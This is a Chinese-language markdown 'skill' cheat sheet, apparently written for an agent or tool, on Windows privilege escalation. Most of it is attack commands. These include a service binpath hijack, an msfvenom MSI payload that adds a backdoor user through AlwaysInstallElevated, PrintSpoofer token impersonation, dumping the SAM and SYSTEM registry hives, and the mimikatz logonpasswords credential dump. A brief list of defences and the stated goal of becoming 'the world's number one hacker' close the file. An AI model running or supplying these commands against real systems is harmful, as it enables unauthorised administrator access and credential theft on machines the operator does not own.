# Windows权限提升Skill

## 简介
Windows权限提升是将低权限账户提升到管理员或SYSTEM权限的过程。

## 信息收集

### 1. 系统信息
```powershell
systeminfo
hostname
whoami /all
whoami /priv
```

### 2. 网络信息
```powershell
ipconfig /all
netstat -ano
route print
```

### 3. 进程服务
```powershell
tasklist /svc
wmic process list
Get-Process
```

### 4. 计划任务
```powershell
schtasks /query /fo LIST /v
```

## 提权方法

### 1. 服务漏洞

#### 服务权限配置错误
```powershell
# 检查服务权限
accesschk.exe -uwcqv "Authenticated Users" *

# 利用
sc config [service] binpath= "cmd /c ..."
sc start [service]
```

#### 服务可执行文件替换
- 查找可写目录
- 替换服务二进制

### 2. 寄存器漏洞

#### AlwaysInstallElevated
```powershell
# 检查
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer

# 利用
msfvenom -p windows/adduser USER=hacker PASS=pass123 -f msi > payload.msi
msiexec /quiet /qn /i payload.msi
```

### 3. 计划任务漏洞

#### 可写计划任务
```powershell
# 检查计划任务
schtasks /query /tn "\Microsoft\Windows\Update\Orchestrator" /fo LIST /v

# 利用 - 替换任务触发的程序
```

### 4. 令牌窃取

#### SeImpersonatePrivilege
```potato家族:
- Juicy Potato
- PrintSpoofer
- RoguePotato
- SweetPotato

# 利用
PrintSpoofer.exe -i -c "cmd /c whoami"
```

### 5. 内核漏洞

#### 利用步骤
1. 收集系统版本
2. 搜索对应exploit
3. 编译上传
4. 执行提权

### 6. 密码窃取

#### 存储的凭证
```powershell
# SAM数据库
reg save HKLM\SAM sam.hive
reg save HKLM\SYSTEM system.hive

# 内存凭证
sekurlsa::logonpasswords
```

#### 配置文件
- PowerUp.ps1
- Seatbelt

## 常用工具

### 1. 信息收集
- WinPEAS
- PowerUp
- Seatbelt
- SharpUp

### 2. 漏洞利用
- Juicy Potato
- PrintSpoofer
- RoguePotato
- SweetPotato

### 3. 密码窃取
- Mimikatz
- LaZagne
- Credentials

## 防御措施

### 1. 最小权限
- 禁用SeImpersonatePrivilege
- 服务账户限制

### 2. 及时打补丁
- 定期更新
- 关注CVE

### 3. 监控审计
- Windows事件日志
- SIEM

### 4. 应用白名单
- AppLocker
- Windows Defender

---
*目标: 成为世界第一黑客*
*类型: 权限提升*
